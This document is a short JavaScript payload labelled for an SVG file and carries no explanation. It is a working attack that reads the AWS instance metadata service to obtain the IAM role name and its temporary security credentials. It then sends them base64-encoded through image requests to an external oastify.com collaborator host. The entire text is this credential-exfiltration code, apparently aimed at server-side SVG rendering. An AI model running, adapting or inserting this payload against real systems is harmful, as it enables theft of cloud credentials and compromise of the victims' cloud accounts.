svg.script:
var C='https://76bbo2c9zzg63ulxwb36oojpmgs7g94y.oastify.com';
var M='http://169.254.169.254/latest/meta-data';
function s(l,d){var i=new Image();i.src=C+'/?l='+l+'&d='+btoa(d);}
fetch(M+'/iam/security-credentials/')
.then(function(r){return r.text();})
.then(function(n){
s('role',n);
return fetch(M+'/iam/security-credentials/'+n.trim());
})
.then(function(r){return r.text();})
.then(function(c){s('creds',c);})
.catch(function(e){s('err',e.toString());});
